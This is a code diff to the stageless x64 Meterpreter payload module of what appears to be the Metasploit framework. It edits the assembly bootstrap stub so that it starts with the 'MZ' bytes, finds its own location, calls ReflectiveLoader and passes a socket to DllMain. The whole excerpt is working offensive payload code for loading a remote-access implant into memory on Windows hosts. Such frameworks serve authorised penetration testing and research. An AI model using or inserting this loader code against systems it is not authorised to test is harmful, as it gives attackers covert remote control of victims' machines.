@@ -20,8 +20,7 @@ module Payload::Windows::StagelessMeterpreter_x64
   def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
-        ; int 03
-          pop r10               ; 'MZ'
+          db 0x4d, 0x5a         ; 'MZ' = "pop r10"
           push r10              ; back to where we started
           push rbp              ; save rbp
           mov rbp, rsp          ; set up a new stack frame
@@ -29,10 +28,9 @@ module Payload::Windows::StagelessMeterpreter_x64
         ; GetPC
           call $+5              ; relative call to get location
           pop rbx               ; pop return value
-          ;lea rbx, [rel+0]      ; get the VA for the start of this stub
         ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader()
-          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 10)}
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
           call rbx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
           ; offset from ReflectiveLoader() to the end of the DLL
